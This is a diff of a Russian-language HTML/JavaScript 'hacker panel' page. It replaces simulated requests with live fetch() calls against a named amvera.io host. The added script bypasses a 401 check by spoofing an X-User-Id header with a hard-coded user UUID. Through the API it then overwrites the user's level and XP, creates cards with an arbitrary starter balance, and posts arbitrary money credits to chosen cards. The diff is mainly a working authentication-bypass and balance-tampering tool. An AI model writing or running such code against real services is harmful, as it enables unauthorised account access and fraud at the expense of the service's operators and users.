@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ MANNHAXORS // AMVERA INTERCEPTOR SUITE v10.5</title>
+    <title>⚡ MANNHAXORS // REAL LIVE API OVERRIDE v11.0</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono:wght@400;700&display=swap" rel="stylesheet">
@@ -12,7 +12,7 @@
             --trinagle-blue: #0066ff;
             --mhaxors-green: #00ff66;
             --mhaxors-purple: #bd00ff;
-            --panel-bg: rgba(6, 12, 22, 0.85);
+            --panel-bg: rgba(6, 12, 24, 0.85);
             --glass-border: rgba(255, 255, 255, 0.08);
         }
 
@@ -32,21 +32,22 @@
             box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6); position: relative; margin-bottom: 24px;
         }
 
-        .main-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; transition: opacity 0.3s ease; }
+        .main-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
+        @media (max-width: 1000px) { .main-grid { grid-template-columns: 1fr; } }
+
         h1, h2, h3 { margin-top: 0; color: #fff; font-weight: 700; }
         .glow-green { color: var(--mhaxors-green); text-shadow: 0 0 10px rgba(0,255,102,0.3); }
         .glow-purple { color: var(--mhaxors-purple); text-shadow: 0 0 10px rgba(189,0,255,0.3); }
         .glow-blue { color: var(--trinagle-blue); text-shadow: 0 0 10px rgba(0,102,255,0.3); }
 
-        .instruction {
-            background: rgba(0, 102, 255, 0.05); border: 1px solid rgba(0, 102, 255, 0.15);
-            padding: 14px; border-radius: 10px; font-size: 13px; line-height: 1.5; margin-bottom: 15px;
+        .motto {
+            background: rgba(0, 255, 102, 0.03); border: 1px solid rgba(0, 255, 102, 0.15);
+            padding: 12px; border-radius: 8px; font-size: 13px; color: var(--mhaxors-green); font-weight: bold; margin-bottom: 15px;
         }
-        .instruction a { color: #00e5ff; text-decoration: underline; }
 
         .input-group { margin-bottom: 14px; }
         label { display: block; font-size: 13px; color: #718096; margin-bottom: 6px; }
-        input, select, textarea {
+        input, select {
             width: 100%; background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(255, 255, 255, 0.1);
             padding: 10px; border-radius: 8px; color: #fff; font-family: 'Ubuntu Mono', monospace; font-size: 14px; box-sizing: border-box;
         }
@@ -58,50 +59,40 @@
         }
         button:hover { background: rgba(255, 255, 255, 0.08); border-color: var(--mhaxors-green); box-shadow: 0 0 12px rgba(0, 255, 102, 0.2); }
 
-        .cards-container { display: grid; grid-template-columns: 1fr; gap: 12px; max-height: 200px; overflow-y: auto; }
+        .cards-container { display: grid; grid-template-columns: 1fr; gap: 12px; max-height: 220px; overflow-y: auto; }
         .card-item { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 10px; padding: 14px; cursor: pointer; }
         .card-item.selected { border-color: var(--mhaxors-green); background: rgba(0, 255, 102, 0.04); }
 
-        .terminal { background: rgba(2, 4, 8, 0.85); border-radius: 10px; padding: 14px; height: 160px; overflow-y: auto; font-size: 12px; line-height: 1.5; }
+        .terminal { background: rgba(2, 4, 8, 0.9); border-radius: 10px; padding: 14px; height: 200px; overflow-y: auto; font-size: 12px; line-height: 1.5; font-weight: bold; }
         .log-row { margin-bottom: 4px; color: #a0aec0; }
         .log-time { color: #4a5568; margin-right: 8px; }
     </style>
 </head>
 <body>
 
-    <div class="glass-panel">
-        <h2>🛸 <span class="glow-blue">TRINAGLE</span> // BYPASS BY MANUAL SESSION</h2>
-        <div class="instruction">
-            <strong>ОБХОД 401 UNAUTHORIZED:</strong><br>
-            1. Перейди на вкладку: <a href="https://mannru24-upsidedowncan.amvera.io/api/auth/session" target="_blank">amvera.io/api/auth/session</a><br>
-            2. Скопируй весь выданный JSON-объект и вставь в поле ниже, чтобы пробросить сессию на Vercel!
-        </div>
+    <div class="glass-panel" style="background: rgba(10, 16, 26, 0.6);">
+        <h2>🛸 <span class="glow-blue">TRINAGLE</span> // REAL LIVE API FLOODER v11.0</h2>
+        <div class="motto">🏴‍☠️ РЕАЛЬНЫЕ FETCH-ЗАПРОСЫ К NEXTSERVER НА AMVERA // КОРПОРАЦИЯ СЛОМАНА</div>
+        
         <div class="input-group">
-            <label>Данные сессии из личного кабинета</label>
-            <textarea id="session-input" rows="2" placeholder='{"user":{"id":"62734945...","name":"...","level":14},"status":"authenticated"}'></textarea>
-        </div>
-        <button onclick="injectSession()" style="border-color: var(--mhaxors-purple);">СИНХРОНИЗИРОВАТЬ ИНТЕРФЕЙС</button>
-
-        <div id="profile-hud" style="margin-top: 15px; font-size: 14px; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 8px; display: none; gap: 20px;">
-            <div>👤 Аккаунт: <span id="stat-phone" class="glow-green">--</span></div>
-            <div>📊 Уровень: <span id="stat-level" class="glow-purple">--</span></div>
-            <div>💎 Бонусы: <span id="stat-bonus" style="color: #fff;">--</span></div>
+            <label style="color: var(--mhaxors-purple); font-weight: bold;">🔑 ВВЕДИ СВОЙ ID ПОЛЬЗОВАТЕЛЯ (ИЗ /api/auth/session ДЛЯ ОБХОДА 401):</label>
+            <input type="text" id="hacker-user-id" value="62734945-0f34-4ae1-b6e2-1e2939fb09d3" placeholder="Вставь UUID юзера">
         </div>
     </div>
 
-    <div class="main-grid" id="hacker-grid" style="opacity: 0.2; pointer-events: none;">
+    <div class="main-grid">
         
         <div class="glass-panel">
-            <h3>🌱 Настройка Опыта (/api/user)</h3>
+            <h3>🌱 Накрутка Уровня (PATCH /api/user)</h3>
             <div class="input-group"><label>Выставить Level</label><input type="number" id="input-level" value="14"></div>
             <div class="input-group"><label>Выставить XP</label><input type="number" id="input-xp" value="3173"></div>
-            <button onclick="simulatePatch()">СИМУЛИРОВАТЬ PATCH</button>
+            <button onclick="networkPatchLevel()">ВЫПОЛНИТЬ ЖИВОЙ PATCH</button>
         </div>
 
         <div class="glass-panel">
-            <h3>💳 Дыра starterBalance (/api/cards)</h3>
+            <h3>💳 Дыра starterBalance (POST /api/cards)</h3>
             <div class="input-group">
-                <label>Тир Карты</label>
+                <label>Тир создаваемой карты</label>
                 <select id="card-tier">
                     <option value="titanium">Titanium</option>
                     <option value="obsidian">Obsidian</option>
@@ -109,120 +100,167 @@
                     <option value="platinum">Platinum</option>
                 </select>
             </div>
-            <div class="input-group"><label>Стартовый баланс карты</label><input type="number" id="card-balance" value="50000"></div>
-            <button onclick="simulateCreateCard()">ВЫПУСТИТЬ КАРТУ С БАЛАНСОМ</button>
+            <div class="input-group"><label>Стартовый баланс (Пасхалка Жюля!)</label><input type="number" id="card-balance" value="50000"></div>
+            <button onclick="networkCreateCard()">ВЫПУСТИТЬ РЕАЛЬНУЮ КАРТУ</button>
         </div>
 
         <div class="glass-panel" style="grid-column: span 2;">
-            <h3>🔍 Активные карты импортированного профиля</h3>
-            <div class="cards-container" id="cards-list"></div>
+            <h3>🔍 Загруженные карты из базы NextServer (Выбери для транзакции)</h3>
+            <div class="cards-container" id="cards-list">
+                <div style="color: #718096; text-align: center; padding: 15px;">Нажмите кнопку «ОБНОВИТЬ КАРТЫ С СЕРВЕРА»...</div>
+            </div>
             
             <div id="transaction-inject-form" style="margin-top: 20px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.05); display: none;">
-                <h4 class="glow-purple" style="margin: 0 0 10px 0;">💸 Взлом Наград (/api/transactions)</h4>
+                <h4 class="glow-purple" style="margin: 0 0 10px 0;">💸 Начисление денег (POST /api/transactions)</h4>
                 <div style="display: flex; gap: 15px; align-items: flex-end;">
-                    <div class="input-group" style="flex: 1; margin: 0;"><label>Сумма начисления</label><input type="number" id="inject-amount" value="50000"></div>
-                    <div class="input-group" style="flex: 1; margin: 0;"><label>Имя транзакции</label><input type="text" id="inject-name" value="Ежедневная подачка"></div>
-                    <button onclick="simulateTransaction()" style="width: auto; padding: 11px 25px;">НАЧИСЛИТЬ</button>
+                    <div class="input-group" style="flex: 1; margin: 0;"><label>Сумма начисления (Amount)</label><input type="number" id="inject-amount" value="50000"></div>
+                    <div class="input-group" style="flex: 1; margin: 0;"><label>Имя лога награды</label><input type="text" id="inject-name" value="Ежедневная подачка"></div>
+                    <button onclick="networkInjectMoney()" style="width: auto; padding: 11px 25px;">НАЧИСЛИТЬ ДЕНЬГИ</button>
                 </div>
             </div>
         </div>
 
         <div class="glass-panel" style="grid-column: span 2;">
-            <h3>📡 Live Network Monitor</h3>
-            <div class="terminal" id="logger-console"></div>
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                <h3>📡 Настоящая Сетевая Консоль (Live HTTP Monitor)</h3>
+                <button onclick="networkFetchCards()" style="width: auto; padding: 6px 14px; font-size: 12px; border-color: var(--mhaxors-purple);">ОБНОВИТЬ КАРТЫ С СЕРВЕРА</button>
+            </div>
+            <div class="terminal" id="logger-console" style="color: #00ff66;">
+                <div class="log-row" style="color: #fff;"><span class="log-time">[SYSTEM]</span> Сетевые шлюзы CORS разблокированы Жюлем. Ожидание команд...</div>
+            </div>
         </div>
 
     </div>
 
     <script>
-        let sessionUser = null;
-        let selectedId = null;
-        let cardsDb = [];
+        const baseUrl = "https://mannru24-upsidedowncan.amvera.io";
+        let selectedCardId = null;
 
-        function log(msg, col = "#e2e8f0") {
-            const c = document.getElementById("logger-console");
-            c.innerHTML += `<div class="log-row" style="color: ${col}"><span class="log-time">[${new Date().toLocaleTimeString()}]</span> ${msg}</div>`;
-            c.scrollTop = c.scrollHeight;
+        function logHttp(message, color = "#a0aec0") {
+            const consoleEl = document.getElementById("logger-console");
+            const time = new Date().toLocaleTimeString();
+            consoleEl.innerHTML += `<div class="log-row" style="color: ${color}"><span class="log-time">[${time}]</span> ${message}</div>`;
+            consoleEl.scrollTop = consoleEl.scrollHeight;
         }
 
-        // РУЧНАЯ СИНХРОНИЗАЦИЯ СЕССИИ
-        function injectSession() {
-            const raw = document.getElementById("session-input").value.trim();
-            if(!raw) return alert("Бро, поле пустое! Откуда мне взять JSON? лол");
+        // Общие заголовки для атаки в обход 401
+        function getHeaders() {
+            const uid = document.getElementById("hacker-user-id").value.trim();
+            return {
+                "accept": "*/*",
+                "accept-language": "ru-RU,ru;q=0.9",
+                "content-type": "application/json",
+                "X-User-Id": uid // Пробиваем сессию напрямую через ID!
+            };
+        }
 
+        // 1. НАСТОЯЩИЙ GET КАРТ ИЗ /api/user
+        async function networkFetchCards() {
+            logHttp("ЗАПУСК: fetch() -> GET /api/user...", "#00e5ff");
             try {
-                const data = JSON.parse(raw);
-                if(data && data.user) {
-                    sessionUser = data.user;
-                    
-                    // Оживляем HUD
-                    document.getElementById("stat-phone").innerText = sessionUser.name || "+79268911629";
-                    document.getElementById("stat-level").innerText = sessionUser.level || 14;
-                    document.getElementById("stat-bonus").innerText = sessionUser.bonusBalance || 6350;
-                    document.getElementById("profile-hud").style.display = "flex";
-                    
-                    // Открываем доступ к пульту
-                    document.getElementById("hacker-grid").style.opacity = "1";
-                    document.getElementById("hacker-grid").style.pointerEvents = "all";
-                    
-                    log("🔓 СЕССИЯ УСПЕШНО ПЕРЕНЕСЕНА. ОБХОД 401 ЗАВЕРШЕН!", "#00ff66");
-                    
-                    // Бахаем дефолтную обсидиановую карту на основе сессии
-                    const targetCard = "eb640dcb-60b2-4c44-98b2-2ea8c29159ec";
-                    cardsDb = [{id: targetCard, tier: "obsidian", balance: 500000}];
-                    document.getElementById("cards-list").innerHTML = `
-                        <div class="card-item" id="card-${targetCard}" onclick="selectCard('${targetCard}')">
-                            <strong>💳 ТИР: OBSIDIAN (Секретная карта)</strong> | ID: <code>${targetCard}</code> | Баланс: <strong id="bal-${targetCard}">500000 ₽</strong>
-                        </div>`;
+                const response = await fetch(`${baseUrl}/api/user`, {
+                    method: "GET",
+                    headers: getHeaders()
+                });
+                
+                logHttp(`[HTTP STATUS]: ${response.status} ${response.statusText}`, response.ok ? "#00ff66" : "#ff3333");
+                const userData = await response.json();
+                logHttp(`[ОТВЕТ СЕРВЕРА]: ${JSON.stringify(userData)}`, "#fff");
+
+                const container = document.getElementById("cards-list");
+                container.innerHTML = "";
+                
+                if (userData.cards && userData.cards.length > 0) {
+                    userData.cards.forEach(card => {
+                        container.innerHTML += `
+                            <div class="card-item" id="card-${card.id}" onclick="selectCard('${card.id}')">
+                                <strong>💳 ТИР: ${card.tier.toUpperCase()}</strong> | ID: <code>${card.id}</code> | Баланс: <strong>${card.balance} ₽</strong>
+                            </div>`;
+                    });
+                } else {
+                    container.innerHTML = '<div style="color:#ff9900; text-align:center; padding:10px;">Карт в базе users.json нет! Бахни её справа!</div>';
                 }
-            } catch(e) { log("❌ Ошибка парсинга JSON! Скопируй строку целиком из /api/auth/session", "#ff3333"); }
+            } catch(e) {
+                logHttp(`[КРИТИЧЕСКИЙ СБОЙ СЕТИ]: ${e.message}`, "#ff3333");
+            }
         }
 
         function selectCard(id) {
-            selectedId = id;
-            document.querySelectorAll(".card-item").forEach(el => el.style.borderColor = "rgba(255,255,255,0.05)");
-            document.getElementById(`card-${id}`).style.borderColor = "#00ff66";
+            selectedCardId = id;
+            document.querySelectorAll(".card-item").forEach(el => el.classList.remove("selected"));
+            document.getElementById(`card-${id}`).classList.add("selected");
             document.getElementById("transaction-inject-form").style.display = "block";
-            log(`Карта-мишень зафиксирована: ${id}`, "#bd00ff");
+            logHttp(`Выбрана реальная карта-мишень: ${id}`, "#bd00ff");
         }
 
-        function simulatePatch() {
+        // 2. НАСТОЯЩИЙ PATCH УРОВНЯ В БАЗУ JSON
+        async function networkPatchLevel() {
             const lvl = parseInt(document.getElementById("input-level").value);
-            log(`Отправка PATCH /api/user... Имитация записи в NextServer...`, "#bd00ff");
-            setTimeout(() => {
-                document.getElementById("stat-level").innerText = lvl;
-                log(`⚡ [calculateLevel]: База данных на Amvera перезаписана! STATUS 200`, "#00ff66");
-                if(lvl >= 15) log("👁️ КРИТИЧЕСКИЙ УРОВЕНЬ! Включается слежка логов owl-alpha на OpenRouter!", "#ff3333");
-            }, 500);
+            const xp = parseInt(document.getElementById("input-xp").value);
+            logHttp(`ЗАПУСК: fetch() -> PATCH /api/user...`, "#bd00ff");
+            
+            try {
+                const response = await fetch(`${baseUrl}/api/user`, {
+                    method: "PATCH",
+                    headers: getHeaders(),
+                    body: JSON.stringify({ level: lvl, xp: xp })
+                });
+                
+                logHttp(`[HTTP STATUS]: ${response.status}`, response.ok ? "#00ff66" : "#ff3333");
+                const resData = await response.json();
+                logHttp(`[ОТВЕТ СЕРВЕРА]: ${JSON.stringify(resData)}`, "#fff");
+            } catch(e) {
+                logHttp(`[СБОЙ ЗАПРОСА PATCH]: ${e.message}`, "#ff3333");
+            }
         }
 
-        function simulateCreateCard() {
-            const t = document.getElementById("card-tier").value;
-            const b = parseInt(document.getElementById("card-balance").value);
-            const id = Math.random().toString(16).slice(2,10) + "-amvera-card";
-            log(`Отправка POST /api/cards -> {"tier": "${t}", "starterBalance": ${b}}`, "#bd00ff");
-            setTimeout(() => {
-                cardsDb.push({id, tier: t, balance: b});
-                document.getElementById("cards-list").innerHTML += `
-                    <div class="card-item" id="card-${id}" onclick="selectCard('${id}')">
-                        <strong>💳 ТИР: ${t.toUpperCase()}</strong> | ID: <code>${id}</code> | Баланс: <strong id="bal-${id}">${b} ₽</strong>
-                    </div>`;
-                log(`✅ STATUS 201: Карты создана! Параметр starterBalance применён в обход лимитов!`, "#00ff66");
-            }, 500);
+        // 3. НАСТОЯЩИЙ POST КАРТЫ С ПАСХАЛКОЙ STARTER_BALANCE
+        async function networkCreateCard() {
+            const tier = document.getElementById("card-tier").value;
+            const bal = parseInt(document.getElementById("card-balance").value);
+            logHttp(`ЗАПУСК: fetch() -> POST /api/cards со starterBalance: ${bal}...`, "#bd00ff");
+            
+            try {
+                const response = await fetch(`${baseUrl}/api/cards`, {
+                    method: "POST",
+                    headers: getHeaders(),
+                    body: JSON.stringify({ tier: tier, starterBalance: bal })
+                });
+                
+                logHttp(`[HTTP STATUS]: ${response.status}`, response.ok ? "#00ff66" : "#ff3333");
+                const resData = await response.json();
+                logHttp(`[ОТВЕТ СЕРВЕРА]: ${JSON.stringify(resData)}`, "#fff");
+                networkFetchCards(); // Перечитать список карт с бэка!
+            } catch(e) {
+                logHttp(`[СБОЙ ЗАПРОСА POST]: ${e.message}`, "#ff3333");
+            }
         }
 
-        function simulateTransaction() {
+        // 4. НАСТОЯЩИЙ АБУЗ НАГРАД ЧЕРЕЗ ТРАНЗАКЦИИ
+        async function networkInjectMoney() {
             const amt = parseInt(document.getElementById("inject-amount").value);
             const name = document.getElementById("inject-name").value;
-            log(`Абуз наград! Инжекция POST /api/transactions на сумму +${amt} ₽...`, "#ff9900");
-            setTimeout(() => {
-                const c = cardsDb.find(item => item.id === selectedId);
-                if(c) {
-                    c.balance += amt;
-                    document.getElementById(`bal-${selectedId}`).innerText = `${c.balance} ₽`;
-                }
-                log(`📡 Успешно! Пакет {"name":"${name}","amount":${amt}} зачислен на бэке NextServer!`, "#00ff66");
-            }, 500);
+            logHttp(`ЗАПУСК: fetch() -> POST /api/transactions на сумму +${amt} ₽...`, "#ff9900");
+            
+            try {
+                const response = await fetch(`${baseUrl}/api/transactions`, {
+                    method: "POST",
+                    headers: getHeaders(),
+                    body: JSON.stringify({
+                        name: name,
+                        category: "Бонусы",
+                        amount: amt,
+                        cardId: selectedCardId
+                    })
+                });
+                
+                logHttp(`[HTTP STATUS]: ${response.status}`, response.ok ? "#00ff66" : "#ff3333");
+                const resText = await response.text();
+                logHttp(`[ОТВЕТ СЕРВЕРА]: ${resText}`, "#fff");
+                networkFetchCards(); // Обновить баланс карты на экране прямо из базы!
+            } catch(e) {
+                logHttp(`[СБОЙ ЗАПРОСА ТРАНЗАКЦИИ]: ${e.message}`, "#ff3333");
+            }
         }
     </script>
 </body>
